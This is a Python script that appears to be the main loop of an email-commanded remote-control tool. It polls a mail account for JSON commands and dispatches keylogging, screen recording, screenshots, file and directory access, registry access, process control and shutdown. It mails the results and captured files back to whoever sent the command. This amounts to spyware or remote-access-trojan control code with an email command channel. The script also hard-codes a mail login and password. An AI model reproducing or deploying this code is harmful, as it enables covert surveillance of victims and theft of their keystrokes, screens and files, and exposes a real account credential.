import time
import json

from sympy import re
from EmailTemplate import EmailTemplate 
from Controls.RegistryControl import RegistryControl 
from Controls.KeyloggerControl import KeyloggerControl
from Controls.FileControl import FileControl
from Controls.ScreenRecordControl import ScreenRecordControl
from Controls.AppProcessServerControl import AppProcessServerControl
from Controls.ScreenshotControl import ScreenshotControl
from Controls.ShutdownRestartControl import ShutdownRestartControl

def LoadParams(request):
    global body
    global method
    global data
    global emailFrom
    global fileAttachment

    if not request:
        return 
    if("From" in request):
        emailFrom = request["From"]

    if("Body" in request):
        body = json.loads(request["Body"])
        if bool(body):
            if("Method" in body):
                method = body["Method"]

            if("Data" in body):
                data = body["Data"]

    if("FileAttachment" in request):
        fileAttachment = request["FileAttachment"]
            
    
def HandleRequest(request, emailTemplate):
    try:
        if not request:
            return

        LoadParams(request)

        if( method != "KEYLOG"
            and method != "SCREENRECORD"
            and method != "DIRECTORY"
            and method != "REGISTRY"
            and method != "SCREENSHOT"
            and method != "APPS"
            and method != "SHUTDOWN"
            and method != "QUIT"):

            return {
                "isSuccess": False,
                "message": "No method found with the " + method 
            }
            
        if(method == "KEYLOG"):
            return KeyloggerControl.KeyloggerHandle(emailTemplate)
        if(method == "DIRECTORY"):
            return FileControl.FileHandle(data, fileAttachment)
        if(method == "REGISTRY"):
            return RegistryControl.RegistryHandle(data)
        if(method == "SCREENRECORD"):
            return ScreenRecordControl.Handle(emailTemplate)
        if(method == "SCREENSHOT"):
            return ScreenshotControl.Handle()
        if(method == "APPS"):
            return AppProcessServerControl.Handle(data)
        if(method == "SHUTDOWN"):
            return ShutdownRestartControl.Handle(emailTemplate)
        if(method == "QUIT"):
            exit(0)
    except:
        return {
                "isSuccess": False,
                "message": "Failed to process from the server. Please try one more time."
            }
         


if __name__ == "__main__":
    gmail = EmailTemplate("theanh@canhcam.com", "Theanh!23")

    while(1):
        content = gmail.Receive()
        if not content: 
            continue
        mail = json.loads(content)

        fileName = False
        filePath = False

        response = HandleRequest(mail, gmail)

        if "fileName" in response:
            fileName = response["fileName"]
        if "filePath" in response:
            filePath = response["filePath"]

        gmail.SendNotification(emailFrom = gmail.username , emailTo = emailFrom, subject = "[No-reply] Server Response", body = json.dumps(response), fileName = fileName, filePath = filePath)
        time.sleep(5)


